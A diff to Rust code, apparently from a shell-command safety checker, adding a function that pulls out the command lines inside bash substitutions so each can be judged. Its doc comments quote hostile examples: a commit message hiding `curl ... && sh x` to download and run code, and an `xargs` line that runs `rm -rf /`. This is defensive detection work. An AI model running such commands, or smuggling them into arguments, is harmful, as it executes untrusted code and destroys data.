@@ -7452,6 +7452,55 @@ pub(crate) fn line_with_known_paths(source: &str) -> Option<String> {
 /// "$H"; echo '{}' > "$H/settings.json"` writes `~/.claude/settings.json`,
 /// though the line never says `.claude` where it writes. `None` when the
 /// line makes no link or uses none after it.
+/// The command lines the substitutions of `source` run, each as written:
+/// `$(...)`, backticks, `<(...)` and `>(...)`, the outermost of each nest
+/// (a nested one is found when the line around it is judged in turn).
+///
+/// Bash runs a substitution before the program it stands in, whatever that
+/// program does with the word: `git commit -m "$(curl -so x URL && sh x)"`
+/// downloads and runs `x` however git reads its message, and so does the
+/// same line as the value of `--body`, `--changelog`, `pytest -k` or any
+/// other argument. The line a substitution holds is a program of its own,
+/// judged by what it runs, in whatever slot it stands. Found where the
+/// parser finds the substitution, never by the name of a flag. Text the
+/// shell does not expand holds none: single quotes, a quoted here-document,
+/// and `$(cat <<'EOF' ... EOF)` (see [`collect_executable_substitutions`]).
+/// A line that does not parse holds none here: it is read the conservative
+/// way as a whole.
+pub(crate) fn lines_substitutions_run(source: &str) -> Vec<String> {
+    if !source.contains("$(")
+        && !source.contains('`')
+        && !source.contains("<(")
+        && !source.contains(">(")
+    {
+        return Vec::new();
+    }
+    let Some(tree) = parse_bash(source) else {
+        return Vec::new();
+    };
+    let mut ranges = Vec::new();
+    collect_executable_substitutions(tree.root_node(), source.as_bytes(), &mut ranges, 0);
+    ranges
+        .into_iter()
+        .filter_map(|range| source.get(range))
+        .filter_map(|written| {
+            written
+                .strip_prefix("$(")
+                .or_else(|| written.strip_prefix("<("))
+                .or_else(|| written.strip_prefix(">("))
+                .and_then(|rest| rest.strip_suffix(')'))
+                .or_else(|| {
+                    written
+                        .strip_prefix('`')
+                        .and_then(|rest| rest.strip_suffix('`'))
+                })
+        })
+        .map(str::trim)
+        .filter(|line| !line.is_empty())
+        .map(str::to_string)
+        .collect()
+}
+
 /// The command lines `xargs` builds from the words a literal `echo` or
 /// `printf` hands it through a pipe: `echo / | xargs -I X rm -rf X` runs
 /// `rm -rf /`, which the line as written does not show. With a replace
